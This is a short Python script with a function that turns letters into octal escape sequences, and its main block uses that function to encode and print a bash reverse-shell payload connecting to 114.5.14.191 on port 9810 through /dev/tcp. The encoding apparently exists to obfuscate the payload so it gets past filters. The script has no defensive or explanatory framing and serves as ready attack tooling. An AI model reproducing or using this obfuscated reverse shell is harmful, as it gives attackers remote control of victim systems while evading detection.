import string


def oct_encode(text: str):
    result = []
    check_list = string.ascii_letters
    for char in text:
        if char in check_list:
            i = oct(ord(char))[2:]
            result.append(r'\\' + i)
            # result += '\\' + i
        else:
            result.append(char)
    return ''.join(result)


if __name__ == '__main__':
    payload = "bash -c 'exec bash -i &>/dev/tcp/114.5.14.191/9810 <&1'"
    print(oct_encode(payload))
